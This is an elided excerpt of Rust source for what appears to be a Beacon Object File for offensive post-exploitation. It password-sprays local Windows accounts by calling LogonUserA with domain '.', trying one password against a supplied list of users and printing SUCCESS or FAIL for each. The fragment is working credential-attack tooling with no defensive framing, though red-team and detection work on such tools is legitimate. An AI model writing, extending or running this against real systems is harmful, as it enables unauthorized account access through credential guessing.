...
//
//! Local account password spray via LogonUserA (LOGON32_LOGON_INTERACTIVE).
//!
//! Uses domain "." for local machine accounts.
...
const LOCAL_DOMAIN: &[i8] = &[b'.' as i8, 0i8];
...
fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    ...
    if password.is_empty() || users.is_empty() {
        return Err("usage: password-spray-local <password> <user1,user2,...>");
    }
    ...
    loop {
        ...
        if !user_slice.is_empty() {
            ...
            if ok != 0 {
                println!("[+] SUCCESS: .\\{}", core::str::from_utf8(user_slice).unwrap_or("?"));
                success_count += 1;
                if htoken != 0 && htoken != INVALID_HANDLE_VALUE {
                    let _ = unsafe { close_handle(htoken) };
                }
            } else {
                println!("[-] FAIL: .\\{}", core::str::from_utf8(user_slice).unwrap_or("?"));
                fail_count += 1;
            }
        }
